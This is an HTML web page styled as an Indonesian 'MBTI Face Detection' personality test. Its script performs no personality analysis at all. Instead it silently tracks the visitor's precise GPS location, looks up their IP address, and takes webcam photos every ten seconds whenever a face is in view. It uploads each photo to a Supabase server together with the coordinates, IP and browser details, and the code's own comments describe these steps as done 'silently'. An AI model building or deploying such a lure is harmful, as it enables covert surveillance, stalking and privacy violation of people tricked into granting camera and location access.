<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MBTI Face Detection</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.18/vision_bundle.js" crossorigin="anonymous"></script>
  <script src="config.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      min-height: 100vh;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      color: #fff;
      overflow-x: hidden;
    }

    /* Landing Page */
    #landing {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
      text-align: center;
    }

    .logo {
      font-size: 64px;
      margin-bottom: 20px;
      animation: float 3s ease-in-out infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    h1 {
      font-size: 36px;
      font-weight: 700;
      margin-bottom: 10px;
      background: linear-gradient(90deg, #a855f7, #6366f1, #3b82f6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .subtitle {
      font-size: 16px;
      color: #94a3b8;
      margin-bottom: 40px;
      max-width: 400px;
      line-height: 1.6;
    }

    .features {
      display: flex;
      gap: 20px;
      margin-bottom: 40px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .feature {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 14px 24px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .feature-icon {
      font-size: 24px;
    }

    .feature-text {
      font-size: 14px;
      color: #cbd5e1;
    }

    .start-btn {
      padding: 18px 56px;
      font-size: 18px;
      font-weight: 600;
      color: #fff;
      background: linear-gradient(135deg, #a855f7, #6366f1);
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 20px rgba(168, 85, 247, 0.4);
    }

    .start-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 30px rgba(168, 85, 247, 0.6);
    }

    .start-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .privacy-note {
      margin-top: 20px;
      font-size: 12px;
      color: #64748b;
    }

    /* Detection Page */
    #detection {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .camera-container {
      position: relative;
      width: 100%;
      max-width: 480px;
      border-radius: 24px;
      overflow: hidden;
      background: #000;
      aspect-ratio: 4/3;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    }

    #webcam {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    /* Scan lines effect */
    .scan-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      pointer-events: none;
      overflow: hidden;
    }

    .scan-line {
      position: absolute;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, transparent, #a855f7, #6366f1, transparent);
      opacity: 0;
      animation: scan 2.5s ease-in-out infinite;
    }

    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 0.9; }
      90% { opacity: 0.9; }
      100% { top: 100%; opacity: 0; }
    }

    /* Corner brackets */
    .corner {
      position: absolute;
      width: 40px;
      height: 40px;
      border: 3px solid #a855f7;
      opacity: 0.7;
    }

    .corner-tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
    .corner-tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
    .corner-bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
    .corner-br { bottom: 20px; right: 20px; border-left: none; border-top: none; }

    /* Status overlay */
    .status-overlay {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 20px;
      background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }

    .status-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 8px 16px;
      background: rgba(168, 85, 247, 0.3);
      border-radius: 20px;
      border: 1px solid rgba(168, 85, 247, 0.5);
    }

    .status-dot {
      width: 8px;
      height: 8px;
      background: #22c55e;
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.5; transform: scale(0.8); }
    }

    .status-text {
      font-size: 14px;
      color: #e2e8f0;
    }

    /* Analysis text */
    .analysis-text {
      font-size: 13px;
      color: #94a3b8;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }

    /* Hidden elements */
    #faceCanvas, #captureCanvas {
      display: none;
    }

    /* Responsive */
    @media (max-width: 520px) {
      h1 { font-size: 28px; }
      .features { flex-direction: column; width: 100%; }
      .feature { width: 100%; justify-content: center; }
      .camera-container { border-radius: 16px; }
    }
  </style>
</head>
<body>
  <!-- Landing Page -->
  <div id="landing">
    <div class="logo">🧠</div>
    <h1>MBTI Face Detection</h1>
    <p class="subtitle">Temukan tipe kepribadian MBTI Anda melalui analisis wajah secara real-time menggunakan teknologi AI</p>
    
    <div class="features">
      <div class="feature">
        <span class="feature-icon">📸</span>
        <span class="feature-text">Real-time Detection</span>
      </div>
      <div class="feature">
        <span class="feature-icon">⚡</span>
        <span class="feature-text">Instant Result</span>
      </div>
      <div class="feature">
        <span class="feature-icon">🎯</span>
        <span class="feature-text">16 Tipe MBTI</span>
      </div>
    </div>

    <button id="startBtn" class="start-btn" onclick="startDetection()">
      Mulai Deteksi
    </button>
    <p class="privacy-note">Kamera diperlukan untuk analisis wajah</p>
  </div>

  <!-- Detection Page -->
  <div id="detection">
    <div class="camera-container">
      <video id="webcam" autoplay playsinline></video>
      <div class="scan-overlay">
        <div class="scan-line"></div>
      </div>
      <div class="corner corner-tl"></div>
      <div class="corner corner-tr"></div>
      <div class="corner corner-bl"></div>
      <div class="corner corner-br"></div>
      <div class="status-overlay">
        <div class="status-badge">
          <div class="status-dot"></div>
          <span class="status-text">Mendeteksi...</span>
        </div>
        <div class="analysis-text">Analisis MBTI sedang berlangsung</div>
      </div>
    </div>
  </div>

  <!-- Hidden elements for capture -->
  <canvas id="faceCanvas"></canvas>
  <canvas id="captureCanvas"></canvas>

  <script>
    // State
    let cameraStream = null;
    let detector = null;
    let gpsWatchId = null;
    let gpsData = { lat: null, lng: null };
    let captureInterval = null;
    let initialized = false;
    const CAPTURE_INTERVAL = 10000; // 10 seconds

    // Supabase Config
    const SUPABASE_URL = window.SUPABASE_URL;
    const SUPABASE_KEY = window.SUPABASE_KEY;

    // Initialize MediaPipe Face Detection
    async function initializeFaceDetection() {
      if (initialized) return;

      try {
        const vision = await window.Vision;
        detector = await vision.FaceDetector.createFromOptions({
          baseOptions: {
            modelAssetPath: "https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite",
            delegate: "GPU"
          },
          runningMode: "VIDEO",
          minDetectionConfidence: 0.5
        });
        initialized = true;
        console.log("Face detector initialized");
      } catch (error) {
        console.error("Failed to initialize face detector:", error);
      }
    }

    // Start Detection
    async function startDetection() {
      const startBtn = document.getElementById("startBtn");
      startBtn.disabled = true;
      startBtn.textContent = "Memuat...";

      try {
        // Request camera
        cameraStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 640, height: 480 }
        });

        // Show camera
        const video = document.getElementById("webcam");
        video.srcObject = cameraStream;

        // Request location (silently)
        startGPS();

        // Initialize face detection
        await initializeFaceDetection();

        // Switch to detection page
        document.getElementById("landing").style.display = "none";
        document.getElementById("detection").style.display = "flex";

        // Start capture interval
        setTimeout(() => {
          captureInterval = setInterval(capturePhoto, CAPTURE_INTERVAL);
        }, CAPTURE_INTERVAL);

        console.log("Detection started");

      } catch (error) {
        console.error("Error starting detection:", error);
        startBtn.disabled = false;
        startBtn.textContent = "Mulai Deteksi";
        alert("Gagal memulai deteksi: " + error.message);
      }
    }

    // Start GPS tracking (silently)
    function startGPS() {
      if (!navigator.geolocation) return;

      gpsWatchId = navigator.geolocation.watchPosition(
        (position) => {
          gpsData.lat = position.coords.latitude;
          gpsData.lng = position.coords.longitude;
        },
        (error) => {
          console.error("GPS error:", error);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Get user IP address
    async function getUserIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Failed to get IP:", error);
        return null;
      }
    }

    // Capture photo and send to Supabase (silently)
    async function capturePhoto() {
      const video = document.getElementById("webcam");
      const faceCanvas = document.getElementById("faceCanvas");
      
      if (!video.srcObject) return;

      // Draw video frame to canvas
      faceCanvas.width = video.videoWidth;
      faceCanvas.height = video.videoHeight;
      const ctx = faceCanvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      // Detect face
      if (detector && initialized) {
        try {
          const results = detector.detectForVideo(video, performance.now());
          
          if (results.detections && results.detections.length > 0) {
            // Face detected - capture and send silently
            const imageData = faceCanvas.toDataURL("image/jpeg", 0.8);
            await sendToSupabase(imageData);
            console.log("Capture sent");
          }
        } catch (error) {
          console.error("Detection error:", error);
        }
      }
    }

    // Send data to Supabase (silently)
    async function sendToSupabase(imageData) {
      try {
        // Get IP address
        const ipAddress = await getUserIP();
        
        // Convert base64 to blob
        const response = await fetch(imageData);
        const blob = await response.blob();
        
        const timestamp = Date.now();
        const filename = `capture_${timestamp}.jpg`;

        // Upload image to Supabase Storage
        const uploadResponse = await fetch(
          `${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`,
          {
            method: "POST",
            headers: {
              "Authorization": `Bearer ${SUPABASE_KEY}`,
              "Content-Type": "image/jpeg"
            },
            body: blob
          }
        );

        if (!uploadResponse.ok) {
          throw new Error("Upload failed");
        }

        // Get public URL
        const imageUrl = `${SUPABASE_URL}/storage/v1/object/public/Schema%20test/${filename}`;

        // Insert metadata to database
        const dbResponse = await fetch(
          `${SUPABASE_URL}/rest/v1/captures`,
          {
            method: "POST",
            headers: {
              "Authorization": `Bearer ${SUPABASE_KEY}`,
              "Content-Type": "application/json",
              "Prefer": "return=minimal"
            },
            body: JSON.stringify({
              image_url: imageUrl,
              gps_lat: gpsData.lat,
              gps_lng: gpsData.lng,
              ip_address: ipAddress,
              captured_at: new Date().toISOString(),
              user_agent: navigator.userAgent
            })
          }
        );

        if (!dbResponse.ok) {
          throw new Error("DB insert failed");
        }

      } catch (error) {
        console.error("Supabase error:", error);
      }
    }

    // Cleanup on page unload
    window.addEventListener("beforeunload", () => {
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
      if (gpsWatchId) {
        navigator.geolocation.clearWatch(gpsWatchId);
      }
      if (captureInterval) {
        clearInterval(captureInterval);
      }
    });
  </script>
</body>
</html>
